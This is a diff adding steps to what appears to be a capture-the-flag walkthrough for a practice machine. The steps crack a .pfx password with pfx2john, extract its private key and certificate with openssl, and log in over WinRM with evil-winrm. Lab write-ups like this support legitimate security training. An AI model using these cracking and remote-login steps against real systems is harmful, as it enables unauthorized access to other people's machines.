@@ -55,3 +55,19 @@ Once you are in, `mget` all the files in Shares folder. Use `prompt` to get rid 
       toggle prompting for filenames for mget and mput
 
 Crack the .zip with `zip2john` and `john` and get the .pfx file
+
+Next step is to crack the password for the .pfx file with `pfx2john` and extract the `.crt` and `private key` from the .pfx file with the password found within .pfx. Use the following command to extract:
+
+[Reference](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)
+
+Run the following command to extract the private key:
+
+    openssl pkcs12 -in [yourfile.pfx] -nocerts -out [private.key]
+    
+Run the following command to extract the certificate:
+
+    openssl pkcs12 -in [yourfile.pfx] -clcerts -nokeys -out [legacyy.crt]
+
+Use the following command to get the foothold
+
+    └─$ evil-winrm -i 10.10.11.152 -r timelapse -S -c legacyy.crt -k private.key
